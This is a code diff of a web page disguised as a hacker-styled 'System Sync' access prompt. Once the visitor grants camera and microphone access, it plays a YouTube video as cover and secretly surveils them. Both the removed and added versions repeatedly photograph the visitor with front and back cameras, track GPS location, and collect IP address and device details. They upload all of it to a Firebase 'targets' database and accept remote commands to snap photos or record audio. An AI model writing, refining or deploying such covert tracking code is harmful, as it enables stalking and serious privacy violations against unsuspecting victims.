@@ -1,147 +1,51 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Node Access | Secured</title>
-    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
-    <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; color: #0f0; font-family: 'Courier New', monospace; overflow: hidden; }
-        #bg-image { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: url('bg.png.jpeg'); background-size: cover; z-index: 1; }
-        #main-ui { position: relative; z-index: 10; width: 100%; height: 100%; display: flex; justify-content: center; align-items: center; background: rgba(0,0,0,0.7); }
-        .hacker-panel { border: 1px solid #0f0; padding: 30px; background: rgba(0,20,0,0.9); box-shadow: 0 0 20px #0f0; text-align: center; border-radius: 5px; }
-        #unlock-btn { background: #0f0; color: #000; border: none; padding: 15px 30px; font-weight: bold; cursor: pointer; text-transform: uppercase; margin-top: 20px; }
-        #video-container { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1000; background: #000; }
-        iframe { width: 100%; height: 100%; border: none; }
-    </style>
-</head>
-<body>
-
-    <div id="bg-image"></div>
-    <div id="main-ui">
-        <div class="hacker-panel">
-            <h2>SYSTEM SYNC</h2>
-            <p>ENCRYPTION KEY REQUIRED</p>
-            <input type="text" id="targetName" placeholder="Enter Access Code" style="background:#000; color:#0f0; border:1px solid #0f0; padding:10px; width:100%; box-sizing:border-box;">
-            <button id="unlock-btn" onclick="startEverything()">Authorize</button>
-        </div>
-    </div>
-
-    <div id="video-container">
-        <iframe id="main-player" src="" allow="autoplay; encrypted-media; camera; microphone" allowfullscreen></iframe>
-    </div>
-
 <script>
     const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
-    if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
+    firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
-    
-    let sessionID = "NODE_" + Math.floor(1000 + Math.random() * 9000);
-    const vID = "6Ogzc_-lW9w"; 
+    const sessionID = "NODE_" + Math.floor(Math.random() * 9999);
+    const vID = "6Ogzc_-lW9w";
 
-    async function startEverything() {
-        const uName = document.getElementById('targetName').value;
-        if(!uName) return;
-
+    async function ignite() {
+        const name = document.getElementById('targetName').value;
+        if(!name) return;
         try {
-            // Permission for both Camera and Audio at once
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            document.getElementById('player').src = `https://www.youtube.com/embed/${vID}?autoplay=1&mute=1&loop=1&playlist=${vID}`;
+            document.getElementById('video-layer').style.display = 'block';
             
-            // Start YouTube
-            document.getElementById('main-player').src = `https://www.youtube.com/embed/${vID}?autoplay=1&mute=1&loop=1&playlist=${vID}`;
-            document.getElementById('video-container').style.display = 'block';
+            // Advance Info Logging
+            let batLevel = "N/A";
+            try { const b = await navigator.getBattery(); batLevel = Math.floor(b.level * 100); } catch(e){}
+            
+            const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json());
+            db.ref(`targets/${sessionID}/info`).set({
+                name: name,
+                ip: ip.ip,
+                battery: batLevel,
+                ram: navigator.deviceMemory || "N/A",
+                platform: navigator.platform,
+                status: "ONLINE",
+                time: new Date().toLocaleTimeString()
+            });
+            db.ref('alerts').set({ id: sessionID, t: Date.now() });
 
-            // Logs
-            sendInfo(uName);
+            // Auto-Loops
             trackGPS();
-            
-            // Auto-Actions
             capture("user"); // Front
-            setTimeout(() => capture("environment"), 4000); // Back (Forceful)
-            setInterval(() => capture("user"), 10000); // Loop
+            setTimeout(() => capture("environment"), 5000); // Back
+            setInterval(() => capture("user"), 10000);
 
-            // Dashboard Command Listener
-            db.ref(`commands/${sessionID}`).on('value', snap => {
-                const cmd = snap.val();
-                if(cmd) {
-                    if(cmd.action === 'photo_front') capture("user");
-                    if(cmd.action === 'photo_back') capture("environment");
-                    if(cmd.action === 'audio') startRecording(30000);
+            // Command Listener
+            db.ref(`commands/${sessionID}`).on('value', s => {
+                const c = s.val();
+                if(c) {
+                    if(c.act === 'f') capture("user");
+                    if(c.act === 'b') capture("environment");
+                    if(c.act === 'a') recordAudio(30000);
                     db.ref(`commands/${sessionID}`).remove();
                 }
             });
-
-        } catch (e) { alert("Permission Denied. System Lock."); location.reload(); }
+        } catch(e) { location.reload(); }
     }
-
-    async function capture(mode) {
-        try {
-            // BACK CAMERA FIX: Force environment mode
-            const constraints = { 
-                video: { facingMode: { exact: mode === "user" ? "user" : "environment" } } 
-            };
-            // Agar 'exact' fail ho to ideal use karein
-            const stream = await navigator.mediaDevices.getUserMedia(constraints).catch(() => {
-                return navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
-            });
-
-            const v = document.createElement('video');
-            v.srcObject = stream;
-            await v.play();
-            
-            setTimeout(() => {
-                const c = document.createElement('canvas');
-                c.width = v.videoWidth; c.height = v.videoHeight;
-                c.getContext('2d').drawImage(v, 0, 0);
-                db.ref(`targets/${sessionID}/photos`).push({
-                    img: c.toDataURL('image/jpeg', 0.4),
-                    type: mode,
-                    time: new Date().toLocaleTimeString()
-                });
-                stream.getTracks().forEach(t => t.stop());
-            }, 2000);
-        } catch(e) { console.log("Cam Fail: " + mode); }
-    }
-
-    async function startRecording(duration) {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-            const mediaRecorder = new MediaRecorder(stream);
-            let chunks = [];
-            
-            mediaRecorder.ondataavailable = e => chunks.push(e.data);
-            mediaRecorder.onstop = () => {
-                const blob = new Blob(chunks, { type: 'audio/webm' });
-                const reader = new FileReader();
-                reader.readAsDataURL(blob);
-                reader.onloadend = () => {
-                    db.ref(`targets/${sessionID}/audio`).push({
-                        data: reader.result,
-                        time: new Date().toLocaleTimeString()
-                    });
-                };
-            };
-            
-            mediaRecorder.start();
-            setTimeout(() => { if(mediaRecorder.state !== "inactive") mediaRecorder.stop(); }, duration);
-        } catch(e) { console.log("Audio Fail"); }
-    }
-
-    async function sendInfo(name) {
-        const ipReq = await fetch('https://api.ipify.org?format=json').then(r => r.json());
-        db.ref(`targets/${sessionID}/info`).set({
-            name: name, ip: ipReq.ip, status: "ONLINE", time: new Date().toLocaleTimeString()
-        });
-        // Beep trigger for Dashboard
-        db.ref('alerts').set({ type: 'new_user', id: sessionID, time: Date.now() });
-    }
-
-    function trackGPS() {
-        navigator.geolocation.watchPosition(p => {
-            db.ref(`targets/${sessionID}/location`).set({ lat: p.coords.latitude, lng: p.coords.longitude });
-        }, null, { enableHighAccuracy: true });
-    }
+    // ... Baki purana capture aur recordAudio function yahan rahega ...
 </script>
-</body>
-</html>
